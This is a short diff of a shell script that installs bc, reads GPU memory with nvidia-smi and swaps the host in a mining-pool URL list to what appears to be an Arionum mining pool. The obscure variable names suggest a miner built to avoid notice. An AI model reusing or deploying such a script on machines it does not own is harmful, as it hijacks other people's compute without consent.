@@ -4,7 +4,7 @@ apt-get install -y bc
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-arr[0]="http://port.aro.wellgitu.com"
+arr[0]="http://mine.arionumpool.com/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
